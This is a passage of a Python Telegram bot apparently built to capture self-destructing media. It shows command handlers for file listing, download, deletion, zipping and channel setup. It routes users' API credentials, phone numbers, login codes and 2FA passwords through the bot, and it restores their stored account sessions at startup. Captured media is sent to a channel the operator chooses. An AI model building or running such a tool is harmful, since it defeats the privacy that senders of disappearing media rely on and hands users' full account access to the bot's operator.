            await event.reply(f"❌ `{file_path}` is a directory, not a file.", parse_mode='markdown')
            return
        
        # Check file size
        file_size = os.path.getsize(file_path)
        if file_size > 1500 * 1024 * 1024:  # 1.5GB
            await event.reply(f"⚠️ File is too large ({file_size/(1024*1024):.1f} MB). Telegram bots have a 2GB limit.")
            return
        
        # Send the file
        await event.reply(f"📤 Sending file: `{file_path}`", parse_mode='markdown')
        
        # Show progress for large files
        if file_size > 10 * 1024 * 1024:  # 10MB
            progress = RichDownloadProgress(os.path.basename(file_path), file_size)
            progress.update(1)
            await asyncio.sleep(0.5)
            progress.close()
        
        await event.client.send_file(
            event.chat_id,
            file_path,
            caption=f"📁 File: {os.path.basename(file_path)}\n📏 Size: {file_size/(1024*1024):.2f} MB"
        )
        
    except Exception as e:
        logger.error(f"Error in /download command: {str(e)}")
        await event.reply(f"❌ Error downloading file: {str(e)}")


async def handle_delete(event, admin_id):
    """Delete a specific file"""
    if not await is_admin(event, admin_id):
        return
    
    try:
        # Extract file path from command
        args = event.text.split()
        if len(args) < 2:
            await event.reply("❌ Usage: /delete <file_path>\nExample: /delete Media/file.jpg")
            return
        
        file_path = ' '.join(args[1:]).strip()
        
        # Check if file exists
        if not os.path.exists(file_path):
            await event.reply(f"❌ File not found: `{file_path}`", parse_mode='markdown')
            return
        
        # Check if it's a directory
        if os.path.isdir(file_path):
            await event.reply(f"❌ `{file_path}` is a directory. Use /deletedir to delete directories.", parse_mode='markdown')
            return
        
        # Get file info before deletion
        file_size = os.path.getsize(file_path)
        file_size_str = f"{file_size/1024:.1f} KB" if file_size < 1024*1024 else f"{file_size/(1024*1024):.1f} MB"
        
        # Confirm deletion
        await event.reply(
            f"⚠️ Are you sure you want to delete this file?\n\n"
            f"📁 `{file_path}`\n"
            f"📏 Size: {file_size_str}\n\n"
            f"Type `/confirm_delete {file_path}` to confirm.",
            parse_mode='markdown'
        )
        
    except Exception as e:
        logger.error(f"Error in /delete command: {str(e)}")
        await event.reply(f"❌ Error: {str(e)}")


async def handle_confirm_delete(event, admin_id):
    """Confirm and delete a file"""
    if not await is_admin(event, admin_id):
        return
    
    try:
        # Extract file path from command
        args = event.text.split()
        if len(args) < 2:
            return
        
        file_path = ' '.join(args[1:]).strip()
        
        # Check if file exists
        if not os.path.exists(file_path):
            await event.reply(f"❌ File not found: `{file_path}`", parse_mode='markdown')
            return
        
        # Delete the file
        os.remove(file_path)
        await event.reply(f"✅ Successfully deleted: `{file_path}`", parse_mode='markdown')
        
    except Exception as e:
        logger.error(f"Error in /confirm_delete command: {str(e)}")
        await event.reply(f"❌ Error deleting file: {str(e)}")


async def handle_all(event, admin_id):
    """Download all media files from media folder"""
    if not await is_admin(event, admin_id):
        return
    
    try:
        # Get all media files
        media_files = []
        total_size = 0
        
        for root, dirs, files in os.walk(all_media_dir):
            for file in files:
                if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
                                         '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm')):
                    file_path = os.path.join(root, file)
                    size = os.path.getsize(file_path)
                    total_size += size
                    media_files.append((file_path, size))
        
        if not media_files:
            await event.reply("📭 No media files found in the media folder.")
            return
        
        # Sort by size (smallest first)
        media_files.sort(key=lambda x: x[1])
        
        total_mb = total_size / (1024 * 1024)
        await event.reply(
            f"📊 Found {len(media_files)} media files ({total_mb:.1f} MB total).\n"
            f"⚠️ Sending all files... This may take a while.\n"
            f"Files will be sent in batches."
        )
        
        # Send files in batches
        sent_count = 0
        batch_size = 10
        
        for i in range(0, len(media_files), batch_size):
            batch = media_files[i:i + batch_size]
            
            # Send batch of files
            for file_path, size in batch:
                try:
                    file_size_mb = size / (1024 * 1024)
                    await event.client.send_file(
                        event.chat_id,
                        file_path,
                        caption=f"📁 {os.path.basename(file_path)} ({file_size_mb:.1f} MB)",
                        allow_cache=False
                    )
                    sent_count += 1
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    logger.error(f"Error sending file {file_path}: {str(e)}")
                    await event.reply(f"❌ Failed to send: {os.path.basename(file_path)}")
            
            # Update progress
            if i + batch_size < len(media_files):
                await event.reply(f"📤 Sent {sent_count}/{len(media_files)} files...")
                await asyncio.sleep(5)
        
        await event.reply(f"✅ Successfully sent {sent_count}/{len(media_files)} media files.")
        
    except Exception as e:
        logger.error(f"Error in /all command: {str(e)}")
        await event.reply(f"❌ Error sending media files: {str(e)}")


async def handle_zip(event, admin_id):
    """Create and send a ZIP archive"""
    if not await is_admin(event, admin_id):
        return
    
    try:
        # Create temporary ZIP file
        timestamp = int(time.time())
        zip_filename = f"media_backup_{timestamp}.zip"
        
        await event.reply("📦 Creating ZIP archive... This may take a while.")
        
        # Create ZIP file
        total_files = 0
        total_size = 0
        
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(all_media_dir):
                # Skip hidden directories
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                
                for file in files:
                    if file.startswith('.'):
                        continue
                    
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, all_media_dir)
                    
                    try:
                        zipf.write(file_path, arcname)
                        total_files += 1
                        total_size += os.path.getsize(file_path)
                    except Exception as e:
                        logger.error(f"Error adding {file_path} to ZIP: {str(e)}")
        
        if total_files == 0:
            await event.reply("📭 No files to add to ZIP archive.")
            os.remove(zip_filename)
            return
        
        zip_size = os.path.getsize(zip_filename)
        zip_size_mb = zip_size / (1024 * 1024)
        
        await event.reply(
            f"📦 ZIP archive created successfully!\n"
            f"• Files: {total_files}\n"
            f"• Size: {zip_size_mb:.1f} MB"
        )
        
        # Check if ZIP is too large for Telegram
        if zip_size > 1900 * 1024 * 1024:  # 1.9GB
            await event.reply(
                f"⚠️ ZIP file is too large ({zip_size_mb:.1f} MB).\n"
                f"Telegram bots have a 2GB file size limit.\n"
                f"Consider creating multiple smaller ZIP files."
            )
            os.remove(zip_filename)
            return
        
        # Send the ZIP file
        await event.client.send_file(
            event.chat_id,
            zip_filename,
            caption=f"📦 Media Backup\n"
                   f"📁 Files: {total_files}\n"
                   f"📏 Size: {zip_size_mb:.1f} MB\n"
                   f"🕒 Created: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        # Clean up
        os.remove(zip_filename)
        
    except Exception as e:
        logger.error(f"Error in /zip command: {str(e)}")
        await event.reply(f"❌ Error creating ZIP: {str(e)}")
        
        # Clean up on error
        try:
            if os.path.exists(zip_filename):
                os.remove(zip_filename)
        except:
            pass

async def handle_ping(event):
    """Handle ping command with multiple endpoints"""

    # Admin check
    try:
        admin_id = int(event.client.admin_id)
    except Exception:
        return

    if event.sender_id != admin_id:
        return

    endpoints = [
        ("Google", "https://www.google.com"),
        ("Telegram", "https://api.telegram.org"),
        ("Cloudflare", "https://1.1.1.1")
    ]

    results = []

    for name, url in endpoints:
        try:
            start_time = time.perf_counter()
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=5)
            ) as session:
                async with session.get(url):
                    ping_time = round((time.perf_counter() - start_time) * 1000)
                    results.append(f"{name}: {ping_time} ms")
        except Exception as e:
            results.append(f"{name}: Failed")

    await event.reply(
        "📡 **Ping Results**\n\n" + "\n".join(results),
        parse_mode="markdown"
    )

# Channel related functions
async def send_to_channel(client, file_path, username, channel_id):
    """Send file to specified channel safely"""

    try:
        if not os.path.exists(file_path):
            logger.error("File does not exist")
            return False

        # Normalize channel_id
        try:
            channel_id = int(channel_id)
        except Exception:
            logger.error(f"Invalid channel_id: {channel_id}")
            return False

        file_size = os.path.getsize(file_path)
        file_size_mb = file_size / (1024 * 1024)
        filename = os.path.basename(file_path)

        caption = (
            f"📥 Downloaded from: @{username}\n"
            f"📁 File: {filename}\n"
            f"📊 Size: {file_size_mb:.2f} MB\n"
            f"🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )

        logger.info(f"Sending file to channel {channel_id}")

        # ✅ Method 1 — direct send (fastest)
        try:
            await client.send_file(
                channel_id,
                file=file_path,
                caption=caption
            )
            logger.info("✓ File sent (direct)")
            return True
        except Exception as e1:
            logger.warning(f"Direct send failed: {e1}")

        # ✅ Method 2 — resolve entity then send
        try:
            entity = await client.get_entity(channel_id)
            await client.send_file(
                entity,
                file=file_path,
                caption=caption
            )
            logger.info("✓ File sent (via entity)")
            return True
        except Exception as e2:
            logger.error(f"Entity send failed: {e2}")

        return False

    except Exception as e:
        logger.exception(f"send_to_channel fatal error: {e}")
        return False

async def handle_setchannel(event, admin_id):
    """Set or update the channel ID where files should be sent"""
    if not await is_admin(event, admin_id):
        await event.reply("❌ You are not authorized to use this command.")
        return
    
    try:
        # Extract channel ID from command
        args = event.text.split()
        if len(args) < 2:
            await event.reply("❌ Usage: /setchannel <channel_id>\nExample: /setchannel -1001234567890")
            return
        
        channel_input = args[1].strip()
        
        # Try to get the channel entity
        try:
            # Try to parse as integer first
            try:
                channel_id_int = int(channel_input)
                channel_entity = await event.client.get_entity(channel_id_int)
                channel_id = channel_entity.id
            except (ValueError, TypeError):
                # If not an integer, try as username
                if not channel_input.startswith('@'):
                    channel_input = '@' + channel_input
                channel_entity = await event.client.get_entity(channel_input)
                channel_id = channel_entity.id
            
            # Update config
            success = await update_channel_id(str(channel_id))
            
            if success:
                # Update the client's config
                event.client.channel_id = channel_id
                
                await event.reply(
                    f"✅ Channel set successfully!\n"
                    f"Channel: {getattr(channel_entity, 'title', 'Unknown')}\n"
                    f"ID: {channel_id}\n"
                    f"All future downloads will be sent to this channel."
                )
            else:
                await event.reply("❌ Failed to update settings file.")
                
        except Exception as e:
            logger.error(f"Error accessing channel {channel_input}: {str(e)}")
            
            # Try to save anyway if it looks like a channel ID
            if channel_input.replace('-', '').isdigit():
                channel_id_int = int(channel_input)
                
                # Store the channel ID
                success = await update_channel_id(str(channel_id_int))
                
                if success:
                    event.client.channel_id = channel_id_int
                    
                    await event.reply(
                        f"⚠️ **Warning:** Could not verify channel access, but ID was saved.\n\n"
                        f"Channel ID: {channel_id_int}\n"
                        f"Note: Bot needs to be added as admin to this channel.\n"
                        f"You may need to add @{(await event.client.get_me()).username} as admin.\n"
                        f"Use /testchannel to verify."
                    )
                else:
                    await event.reply("❌ Failed to update settings file.")
            else:
                await event.reply(
                    f"❌ Error: Could not access channel. Make sure:\n"
                    f"1. The bot is added to the channel as an admin\n"
                    f"2. You're using the correct channel ID (e.g., -1001234567890)\n"
                    f"3. For private channels, use the numeric ID\n\n"
                    f"Error details: {str(e)}"
                )
            
    except Exception as e:
        logger.error(f"Error in /setchannel command: {str(e)}")
        await event.reply(f"❌ Error: {str(e)}")


async def handle_testchannel(event, admin_id):
    """Test channel access by sending a test message"""
    if not await is_admin(event, admin_id):
        await event.reply("❌ You are not authorized to use this command.")
        return
    
    channel_id = getattr(event.client, 'channel_id', None)
    
    if not channel_id:
        await event.reply("❌ No channel configured. Use /setchannel first.")
        return
    
    try:
        await event.reply(f"🔄 Testing channel access for ID: {channel_id}")
        
        # Test 1: Try to get channel info
        try:
            entity = await event.client.get_entity(channel_id)
            channel_title = getattr(entity, 'title', 'Unknown')
            await event.reply(f"✅ Channel found: {channel_title} (ID: {channel_id})")
        except Exception as e:
            await event.reply(f"⚠️ Cannot get channel info: {str(e)}")
        
        # Test 2: Try to send a text message
        try:
            test_message = f"✅ Bot Test Message\nTime: {time.strftime('%Y-%m-%d %H:%M:%S')}\nBot: @{(await event.client.get_me()).username}"
            await event.client.send_message(entity=channel_id, message=test_message)
            await event.reply(f"✅ Test message sent to channel successfully!")
        except Exception as e:
            await event.reply(f"❌ Failed to send test message: {str(e)}")
            await event.reply("⚠️ Make sure:\n1. Bot is added to channel\n2. Bot has 'Send Messages' permission\n3. Channel ID is correct")
        
        # Test 3: Try to send a small file
        try:
            # Create a small test file
            test_file = "test_channel.txt"
            with open(test_file, "w") as f:
                f.write(f"Test file for channel\nTime: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            
            await event.client.send_file(
                entity=channel_id,
                file=test_file,
                caption="Test file for channel"
            )
            await event.reply(f"✅ Test file sent to channel successfully!")
            
            # Clean up
            os.remove(test_file)
        except Exception as e:
            await event.reply(f"❌ Failed to send test file: {str(e)}")
        
    except Exception as e:
        await event.reply(f"❌ Error testing channel: {str(e)}")


async def handle_currentchannel(event, admin_id):
    """Show current channel configuration"""
    if not await is_admin(event, admin_id):
        await event.reply("❌ You are not authorized to use this command.")
        return
    
    channel_id = getattr(event.client, 'channel_id', None)
    
    if channel_id:
        try:
            entity = await event.client.get_entity(channel_id)
            await event.reply(
                f"📢 **Current Channel Configuration**\n"
                f"• Channel: {getattr(entity, 'title', 'Unknown')}\n"
                f"• ID: {channel_id}\n"
                f"• Username: @{getattr(entity, 'username', 'None')}\n"
                f"• All downloads are being sent to this channel."
            )
        except Exception as e:
            await event.reply(
                f"⚠️ Channel ID is set to {channel_id}, but I can't access it.\n"
                f"Error: {str(e)}\n"
                f"Make sure the bot is added as admin to this channel.\n"
                f"Use /setchannel to update the channel."
            )
    else:
        await event.reply(
            "⚠️ **No channel configured!**\n"
            "Files are only being saved locally, not sent to any channel.\n"
            "Use /setchannel <channel_id> to configure a destination channel."
        )


async def handle_help(event, admin_id):
    """Show help message"""
    if not await is_admin(event, admin_id):
        # Show user help
        user_help = """
🤖 **Self-Destructing Media Downloader Bot**

**User Commands:**
/login - Login with your own Telegram account
/logout - Logout from your account
/mystatus - Check your login status
/savetips - Tips for saving self-destructing media

**How it works:**
1. Use /login to login with your own account
2. When you receive self-destructing media in your account
3. File will be sent to configured channel

**Note:** Admin commands are not available for regular users.
        """
        await event.reply(user_help)
        return
    
    # Show admin help
    help_text = """
🤖 **Self-Destructing Media Downloader Bot**

**Channel Commands:**
/setchannel <id> - Set channel for saving files
/currentchannel - Show current channel config
/testchannel - Test channel access

**File Management Commands:**
/files - List all files in Media folder only
/check - Check for new files in media folder
/download <path> - Download specific file
/delete <path> - Delete specific file
/confirm_delete <path> - Confirm file deletion
/all - Download all media files from media folder
/zip - Create and send ZIP archive of Media folder

**System Commands:**
/ping - Check bot status and network latency
/status - Show download statistics
/help - Show this help message
/savetips - Tips for saving self-destructing media

**User Session Commands:**
/login - Login with your own Telegram account
/logout - Logout from your account
/mystatus - Check your login status

**Features:**
• Auto-downloads photos, videos, documents
• Organized user folders (A - @username - ID)
• Sends files to configured Telegram channel
• Progress tracking for downloads
• File management tools
• User session login support

**Note:** All file paths should be relative to the Media folder
Example: /download 00 - A - @user - 123456789/file.jpg
    """
    await event.reply(help_text)


async def handle_status(event, admin_id, state):
    """Show download statistics"""
    if not await is_admin(event, admin_id):
        return
    
    count_photos = count_videos = count_docs = 0
    total_size = 0
    
    for root, dirs, files in os.walk(all_media_dir):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                size = os.path.getsize(filepath)
                total_size += size
            except:
                continue
            
            if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
                count_photos += 1
            elif file.lower().endswith(('.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm')):
                count_videos += 1
            else:
                count_docs += 1
    
    total_mb = total_size / (1024 * 1024) if total_size > 0 else 0
    
    # Check channel status
    channel_id = getattr(event.client, 'channel_id', None)
    channel_status = "✅ Configured" if channel_id else "❌ Not configured"
    
    # Count logged-in users
    logged_in_users = len(state.get("user_sessions", {}))
    
    await event.reply(
        f"📊 **Download Statistics**\n"
        f"• Photos: {count_photos}\n"
        f"• Videos: {count_videos}\n"
        f"• Documents: {count_docs}\n"
        f"• Total Size: {total_mb:.2f} MB\n"
        f"• Users: {len(state['user_folders'])}\n"
        f"• Logged-in Users: {logged_in_users}\n"
        f"• Channel: {channel_status}\n"
        f"• Login Type: Bot Token"
    )


async def handle_savetips(event):
    """Show tips for saving self-destructing media"""
    tips = """
⚠️ **How to Save Self-Destructing Media:**

**Method 1: Using User Account (Recommended)**
1. **Login with your own account:**
   - Use /login command in bot
   - Follow the login steps
   - Your account will be connected

2. **Receive self-destructing media:**
   - When someone sends you self-destructing media
   - Bot will automatically detect and save it
   - File will be sent to your channel

**Method 2: Manual Save (if not logged in)**
1. **When you receive self-destructing media:**
   - Tap and hold on the photo/video
   - Select "Save to Gallery" or "Download"
   - Do this BEFORE it disappears

2. **Then send to this bot:**
   - Open your device's gallery/files
   - Select the saved media
   - Send it to @{} (this bot)

**Important:** Bots cannot directly access self-destructing media sent to them.
You MUST use Method 1 (login with your account) for automatic saving.

**For best results:**
1. Use /login to connect your account
2. Receive self-destructing media in your account
3. Bot will handle everything automatically
    """.format((await event.client.get_me()).username)
    
    await event.reply(tips)


async def main():
    """Main function to run the bot"""
    api_id, api_hash, admin_id, bot_token, session_name, channel_id = await load_config()
    
    if not bot_token:
        console.print("[red]Bot token is required![/red]")
        console.print("[yellow]This bot only works with bot token.[/yellow]")
        return
    
    # Load bot state
    state = await load_state()
    
    # Initialize client with bot token only
    client = TelegramClient(
        session=session_name,
        api_id=int(api_id),
        api_hash=api_hash
    )
    
    # Store channel_id in client object for easy access
    if channel_id:
        try:
            # Convert to integer if it's a string
            if isinstance(channel_id, str):
                channel_id = int(channel_id)
            client.channel_id = channel_id
        except (ValueError, TypeError):
            client.channel_id = None
            console.print("[yellow]Warning: Invalid channel ID in settings[/yellow]")
    else:
        client.channel_id = None
    
    # Store admin_id in client for easy access
    client.admin_id = admin_id
    
    # Store bot client globally for user sessions
    global BOT_CLIENT
    BOT_CLIENT = client
    
    # Event handlers for commands
    @client.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        await handle_start(event, admin_id)
    
    @client.on(events.NewMessage(pattern='/help'))
    async def help_handler(event):
        await handle_help(event, admin_id)
    
    @client.on(events.NewMessage(pattern='/ping'))
    async def ping_handler(event):
        await handle_ping(event)
    
    @client.on(events.NewMessage(pattern='/status'))
    async def status_handler(event):
        await handle_status(event, admin_id, state)
    
    @client.on(events.NewMessage(pattern='/files'))
    async def files_handler(event):
        await handle_files(event, admin_id)
    
    @client.on(events.NewMessage(pattern='/check'))
    async def check_handler(event):
        await handle_check(event, admin_id)
    
    @client.on(events.NewMessage(pattern=r'/download\s+(.+)?'))
    async def download_handler(event):
        await handle_download(event, admin_id)
    
    @client.on(events.NewMessage(pattern=r'/delete\s+(.+)?'))
    async def delete_handler(event):
        await handle_delete(event, admin_id)
    
    @client.on(events.NewMessage(pattern=r'/confirm_delete\s+(.+)?'))
    async def confirm_delete_handler(event):
        await handle_confirm_delete(event, admin_id)
    
    @client.on(events.NewMessage(pattern='/all'))
    async def all_handler(event):
        await handle_all(event, admin_id)
    
    @client.on(events.NewMessage(pattern='/zip'))
    async def zip_handler(event):
        await handle_zip(event, admin_id)
    
    @client.on(events.NewMessage(pattern=r'/setchannel\s+(.+)?'))
    async def setchannel_handler(event):
        await handle_setchannel(event, admin_id)
    
    @client.on(events.NewMessage(pattern='/currentchannel'))
    async def currentchannel_handler(event):
        await handle_currentchannel(event, admin_id)
    
    @client.on(events.NewMessage(pattern='/testchannel'))
    async def testchannel_handler(event):
        await handle_testchannel(event, admin_id)
    
    # User session commands
    @client.on(events.NewMessage(pattern='/login'))
    async def login_handler(event):
        await handle_login(event, admin_id, client, state)
    
    @client.on(events.NewMessage(pattern='/skip'))
    async def skip_handler(event):
        await handle_skip(event, admin_id, state)
    
    @client.on(events.NewMessage(pattern='/cancel'))
    async def cancel_handler(event):
        await handle_cancel(event, admin_id, state)
    
    @client.on(events.NewMessage(pattern='/logout'))
    async def logout_handler(event):
        await handle_logout(event, admin_id, state)
    
    @client.on(events.NewMessage(pattern='/mystatus'))
    async def mystatus_handler(event):
        await handle_mystatus(event, admin_id, state)
    
    # Self-destructing media tips
    @client.on(events.NewMessage(pattern='/savetips'))
    async def savetips_handler(event):
        await handle_savetips(event)
    
    # Handle plain messages during login (not starting with /)
    @client.on(events.NewMessage(func=lambda e: e.is_private and e.text and not e.text.startswith('/')))
    async def plain_message_handler(event):
        """Handle plain messages during login process"""
        user_id = event.sender_id
        user_data = state.get("login_sessions", {}).get(str(user_id))
        
        if not user_data:
            return
        
        current_step = user_data.get("step")
        
        if current_step == "api_id":
            await handle_api_id(event, admin_id, state)
        elif current_step == "api_hash":
            await handle_api_hash(event, admin_id, state)
        elif current_step == "phone":
            await handle_phone(event, admin_id, state, client)
        elif current_step == "code":
            await handle_code(event, admin_id, state)
        elif current_step == "2fa":
            await handle_2fa(event, admin_id, state)
    
    # Universal media handler - catches ALL media including self-destructing
    @client.on(events.NewMessage(func=lambda e: e.is_private))
    async def universal_media_handler(event):
        """Detect media & self-destructing messages sent to the bot"""

        try:
            # Ignore commands
            if event.text and event.text.startswith("/"):
                return

            # ✅ Ignore logged-in users (handled by user client)
            if str(event.sender_id) in state.get("user_sessions", {}):
                return

            has_media = bool(event.media)
            is_self_destruct = bool(
                getattr(getattr(event.media, "photo", None), "ttl_seconds", None) or
                getattr(getattr(event.media, "document", None), "ttl_seconds", None)
            )

            if not has_media and not is_self_destruct:
                return

            console.print("[yellow]Bot received media[/yellow]")
            console.print(f"[cyan]Sender: {event.sender_id}[/cyan]")
            console.print(f"[cyan]Has media: {has_media}[/cyan]")
            console.print(f"[cyan]Self-destruct: {is_self_destruct}[/cyan]")

            # TTL → explain limitation
            if is_self_destruct:
                await event.reply(
                    "⚠️ **Self-destructing media detected**\n\n"
                    "Telegram does NOT allow bots to save this type of media.\n\n"
                    "✅ **What you must do:**\n"
                    "1. Login using `/login`\n"
                    "2. Receive self-destructing media in your account\n"
                    "3. Bot will automatically save it\n\n"
                    "Use /savetips for details.",
                    parse_mode="markdown"
                )
                return

            # Normal media
            await event.reply(
                "📥 Media received.\n\n"
                "⚠️ For automatic saving of self-destructing media, "
                "you must login with `/login`."
            )

        except Exception as e:
            console.print(f"[red]Universal handler error: {e}[/red]")
    
    try:
        # Start the bot with bot token only
        await client.start(bot_token=bot_token)
        
        me = await client.get_me()
        
        console.print(f"[green]✓ Bot started successfully with Bot Token![/green]")
        console.print(f"[cyan]Bot: @{me.username}[/cyan]")
        console.print(f"[cyan]Bot ID: {me.id}[/cyan]")
        console.print(f"[yellow]Admin ID: {admin_id}[/yellow]")
        
        if client.channel_id:
            try:
                channel_entity = await client.get_entity(client.channel_id)
                console.print(f"[green]✓ Channel configured: {getattr(channel_entity, 'title', 'Unknown')} ({client.channel_id})[/green]")
            except Exception as e:
                console.print(f"[yellow]⚠ Cannot access channel {client.channel_id}: {e}[/yellow]")
                console.print("[yellow]Make sure the bot is added as admin to the channel[/yellow]")
        else:
            console.print("[yellow]⚠ No channel configured. Use /setchannel to set one.[/yellow]")
        
        # Show logged in users
        logged_in_users = len(state.get("user_sessions", {}))
        console.print(f"[cyan]Logged-in users: {logged_in_users}[/cyan]")
        
        # Restore existing user sessions
        for user_id_str, user_data in state.get("user_sessions", {}).items():
            try:
                user_id = int(user_id_str)
                user_session_file = user_data.get("session_file")
                
                if user_session_file and os.path.exists(user_session_file):
                    async with aiofiles.open(user_session_file, mode="r") as f:
                        session_string = await f.read()
                    
                    session = StringSession(session_string)
                    user_client = TelegramClient(
                        session,
                        user_data["api_id"],
                        user_data["api_hash"]
                    )
                    
                    await user_client.connect()
                    if await user_client.is_user_authorized():
                        # Setup handlers for user client
                        await setup_user_client_handlers(user_client, user_id, client, state)
                        ACTIVE_USER_CLIENTS[user_id_str] = user_client
                        await user_client.start()
                        console.print(f"[green]✓ Restored user session: {user_data.get('username', 'Unknown')}[/green]")
                    else:
                        await user_client.disconnect()
            except Exception as e:
                console.print(f"[red]Error restoring user session {user_id_str}: {e}[/red]")
        
        console.print("[green]Bot is ready! Use /testchannel to verify channel access.[/green]")
        console.print("[yellow]Note: For self-destructing media, users must login with /login command.[/yellow]")
        
        await client.run_until_disconnected()
        
    except Exception as e:
        console.print(f"[red]✗ Fatal error: {e}[/red]")
        logger.critical(f"Bot crashed: {e}")
    finally:
        # Disconnect all user clients
        for user_id_str, user_client in ACTIVE_USER_CLIENTS.items():
            try:
                await user_client.disconnect()
            except:
                pass
        
        await client.disconnect()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]Bot stopped by user[/yellow]")
    except Exception as e:
        console.print(f"[red]Unhandled exception: {e}[/red]")
